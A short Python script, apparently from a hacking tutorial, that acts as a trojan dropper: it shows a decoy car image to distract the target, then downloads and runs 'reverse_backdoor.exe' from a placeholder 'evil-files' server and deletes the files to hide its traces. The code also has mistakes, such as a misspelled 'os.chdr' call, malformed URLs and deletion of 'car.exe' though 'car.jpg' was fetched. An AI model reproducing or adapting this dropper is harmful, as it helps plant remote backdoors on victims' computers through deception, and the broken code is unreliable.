#!/usr/bin/env python

import subprocess, requests, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    # print(file_name)
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)



temp_directory = tempfile.gettempdir()
os.chdr(temp_directory)
# the user downloads the car image
download("http/webserver/evil-files/car.jpg")
# the user opens the car image and continues the code execution , we use the .Popen
subprocess.Popen("car.jpg", shell=True)
# the user downloads the evil file
download("http/webserver/evil-files/reverse_backdoor.exe")
# the user opens the evil file and waits, we use the .call
subprocess.call("reverse_backdoor.exe", shell=True)

# remove the downloaded files from target computer
os.remove("car.exe")
os.remove("reverse_backdoor.exe")

